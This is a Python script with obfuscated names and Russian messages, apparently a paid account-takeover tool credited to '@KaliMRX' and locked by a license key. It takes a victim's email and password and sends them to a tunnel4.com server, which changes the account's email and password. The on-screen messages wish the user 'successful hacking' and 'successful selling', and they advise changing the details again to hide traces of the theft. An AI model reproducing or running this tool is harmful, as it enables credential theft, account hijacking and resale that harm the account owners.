import requests #line:1
import colorama #line:2
import os #line:3
import time #line:4
from rich .console import Console #line:5
from rich_gradient import Gradient #line:6
os .system ("cls || clear")#line:8
console =Console ()#line:9
def Auth (OO000OO0OOO0000OO ):#line:11
    O00000OO0OO000O00 =requests .post (f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/Auth/{OO000OO0OOO0000OO}")#line:12
    OO0O0O0O0O0000000 =O00000OO0OO000O00 .json ()#line:13
    return OO0O0O0O0O0000000 #line:15
def GetID_TOKEN (O0O0OOOOO0O0OOO00 ,O00O00OOO0OOO0000 ,OOOO0O0O00OO0OOO0 ):#line:17
    OOO0O0OO00O00O000 ={"Content-Type":"application/json"}#line:20
    OO00OOO00OO0OO0O0 ={"email":O0O0OOOOO0O0OOO00 ,"password":O00O00OOO0OOO0000 ,"key":OOOO0O0O00OO0OOO0 }#line:26
    OO000OO0O00000OOO =requests .post (f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/GetID_TOKEN/",headers =OOO0O0OO00O00O000 ,json =OO00OOO00OO0OO0O0 )#line:28
    O0000OOOOOOOOO0O0 =OO000OO0O00000OOO .json ()#line:29
    if OO000OO0O00000OOO .status_code ==200 :#line:31
        if O0000OOOOOOOOO0O0 ==3 :#line:32
            print ("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")#line:33
        if O0000OOOOOOOOO0O0 ==1 :#line:35
            O0OO000OO0000O00O =O0000OOOOOOOOO0O0 #line:36
            os .system ("cls || clear")#line:37
            print (f"Успешный логин в аккаунт :D\n{colorama.Fore.GREEN}+-------УДАЧНОГО ВЗЛОМА :)-------+"+colorama .Fore .WHITE )#line:38
            return 1 #line:39
    else :#line:40
        print (colorama .Fore .RED +"+-------ПЕЧАЛЬКА :(-------+")#line:41
        print (str (O0000OOOOOOOOO0O0 )+colorama .Fore .WHITE )#line:42
def UPDATE_TOKEN (O0O0OOOO0OO0O00OO ,OO0O00OO0OO0OOO0O ,O00OO00OO0OO0000O ):#line:44
    O0O0O00O0OO0OOO0O ={"Content-Type":"application/json"}#line:47
    O0OOOO0O00OOOOOOO ={"email":O0O0OOOO0OO0O00OO ,"password":OO0O00OO0OO0OOO0O ,"key":O00OO00OO0OO0000O }#line:53
    OO0OOOO0O00000O0O =requests .post (f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/GetID_TOKEN/",headers =O0O0O00O0OO0OOO0O ,json =O0OOOO0O00OOOOOOO )#line:55
    OO0O0OOO00OOO0000 =OO0OOOO0O00000O0O .json ()#line:56
    if OO0OOOO0O00000O0O .status_code ==200 :#line:58
        if OO0O0OOO00OOO0000 ==3 :#line:59
            print ("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")#line:60
        if OO0O0OOO00OOO0000 ==1 :#line:62
            OOO000O0OOOOO0O0O =OO0O0OOO00OOO0000 #line:63
            return 1 #line:64
    else :#line:65
        print (colorama .Fore .RED +"+-------ПЕЧАЛЬКА :(-------+")#line:66
        print (str (OO0O0OOO00OOO0000 )+colorama .Fore .WHITE )#line:67
def CHANGE_EMAIL (OO0O0O000OOO0O0OO ,O000OOO00OO00O00O ):#line:70
    O00O00O0OO0O000O0 ={"Content-Type":"application/json"}#line:73
    O000O0O0O0O0OO000 ={"email":OO0O0O000OOO0O0OO ,"key":O000OOO00OO00O00O }#line:78
    O000OO0OO0OOOO0O0 =requests .post (f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/CHANGE_EMAIL/",headers =O00O00O0OO0O000O0 ,json =O000O0O0O0O0OO000 )#line:80
    O0OOOOOOO0OO0OO0O =O000OO0OO0OOOO0O0 .json ()#line:81
    if O000OO0OO0OOOO0O0 .status_code ==200 :#line:83
        if O0OOOOOOO0OO0OO0O ==3 :#line:84
            print ("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")#line:85
        if O0OOOOOOO0OO0OO0O ==1 :#line:87
            print (colorama .Fore .GREEN +f"Почта УСПЕШНО изменена :) ~> [ {OO0O0O000OOO0O0OO} ]"+colorama .Fore .WHITE )#line:88
    else :#line:89
        print (colorama .Fore .RED +"+-------ПЕЧАЛЬКА :(-------+")#line:90
        print (str (O0OOOOOOO0OO0OO0O )+colorama .Fore .WHITE )#line:91
def CHANGE_PASSWORD (OO0OOO00OO0OO00OO ,O0O0OOO0OO000OOOO ):#line:94
    OOO0OOOOO0O0OO0O0 ={"Content-Type":"application/json"}#line:97
    OO0000O0OOOO0O0O0 ={"password":OO0OOO00OO0OO00OO ,"key":O0O0OOO0OO000OOOO }#line:102
    O0O0O000O00O000O0 =requests .post (f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/CHANGE_PASSWORD/",headers =OOO0OOOOO0O0OO0O0 ,json =OO0000O0OOOO0O0O0 )#line:104
    O0O00OOOOO00O000O =O0O0O000O00O000O0 .json ()#line:105
    if O0O0O000O00O000O0 .status_code ==200 :#line:107
        if O0O00OOOOO00O000O ==3 :#line:108
            print ("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")#line:109
        if O0O00OOOOO00O000O ==1 :#line:111
            print (colorama .Fore .GREEN +f"Пароль УСПЕШНО изменён :) ~> [ {OO0OOO00OO0OO00OO} ] \n\n!Для 100% кражи советую изменить данные повторно для скрытия следов!\n        ---[ УДАЧНОЙ ПРОДАЖИ ]---"+colorama .Fore .WHITE )#line:112
    else :#line:113
        print (colorama .Fore .RED +"+-------ПЕЧАЛЬКА :(-------+")#line:114
        print (str (O0O00OOOOO00O000O )+colorama .Fore .WHITE )#line:115
console .print (Gradient ("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⣶⣿⣿⣿⣿⣿⣿⣿⣿⠟⠙⢻⡷⢶⣤⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡛⠛⠋⠉⠉⠁⠀⢐⣤⢴⣤⣀⠀⠛⠿⣷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡄⠀⠀⠀⠀⢀⣯⣀⡴⣤⡈⠃⠀⠀⠈⠙⢿⣦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡄⠀⠀⠀⣿⣤⡍⢡⢛⣋⡇⠀⠀⠀⠀⠀⠙⢷⣄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⡇⢿⡼⢤⣌⣿⡇⡀⠀⠀⠀⠀⠀⠀⠙⢆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢼⡇⢀⣸⣇⣸⣿⣦⣿⣿⢁⠈⡤⡀⠀⠀⠀⠀⠀⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⣷⡏⡿⢯⡻⣿⣿⠇⢇⠎⠞⣵⡷
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣷⠀⢀⡙⠾⣿⣼⣯⣾⣀⡿⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⢻⡎⣿⣿⣦⡀⠙⢿⡿⣯⣲⣶⣃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⢸⣷⢸⣿⣞⢿⣆⠀⡀⢈⠉⠻⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⣹⣿⣿⠀⣿⡄⣿⣿⣆⠹⣷⣼⣶⣷⣄⣾⠋
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⡅⣿⣿⢹⠀⠘⣧⢹⣿⣿⣦⡘⢧⠉⡛⠛⢿⣄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢣⣇⡟⣿⠈⢠⠀⠹⡆⠻⣿⣿⡳⣄⠱⣌⠃⢸⡿⣦
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢇⣾⣿⡇⢿⠀⣿⢰⠀⢻⣆⠹⣿⣿⣌⢓⢬⡛⢸⡇⠘⡖⣄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⣾⣿⢹⡇⠀⠀⣿⠸⣧⠀⢻⣷⡙⢏⢻⣿⣝⢦⢻⣧⠀⢹⡘⢦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠃⢰⡟⣿⢸⡇⠀⢸⣿⠀⣿⣆⠀⢻⣟⠦⠀⢿⣿⣮⢻⣿⠀⣼⡇⡈⢻⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠁⣿⠘⠁⠀⢸⣿⡄⠘⣿⡄⢠⠙⣦⠀⠈⣿⠈⠋⠃⣴⡟⢇⢻⡀⢻⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀⣿⠀⠀⠀⣿⣿⣇⠀⢹⣿⡀⢳⡄⠀⠀⣿⠀⢠⣾⢿⠁⠀⠈⣧⠀⢧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⢱⠀⠀⠀⣿⡏⠹⡆⠀⢹⣧⠀⢻⣆⠀⠁⢀⣿⣷⡈⠀⠀⠀⠸⣇⠸⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠙⣆⠀⢻⡄⠀⠹⣷⣄⠘⢻⡿⣷⡄⠀⠀⠀⣯
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠀⠀⠀⠀⠀⠈⠇⠀⠀⠀⠘⠂⠀⢧⠙⣿⢦
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉

⣿⣏⢽⣟⠻⣿⢟⠟⣻⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿""",colors =["red","black"]))#line:141
print ("Создатель софта: @KaliMRX")#line:142
key =input ("Key: ")#line:144
auth_res =Auth (key )#line:145
if auth_res ==1 :#line:146
    email =input ("Email: ")#line:147
    passwd =input ("Password: ")#line:148
    out =GetID_TOKEN (email ,passwd ,key )#line:149
    if out ==1 :#line:151
        new_email =input ("New Email: ")#line:152
        new_passwd =input ("New Password: ")#line:153
        os .system ("cls || clear")#line:154
        CHANGE_EMAIL (new_email ,key )#line:155
        UPDATE_TOKEN (new_email ,passwd ,key )#line:156
        CHANGE_PASSWORD (new_passwd ,key )#line:157
    else :#line:158
        print ("Неверные данные!")#line:159
        exit ()#line:160
elif auth_res ==3 :#line:161
    print ("Срок ключа истек!")#line:162
else :#line:163
    print ("Неверный ключ! (Если после покупки ключа не прошел месяц напиши сюда: @KaliMRX)")#line:164
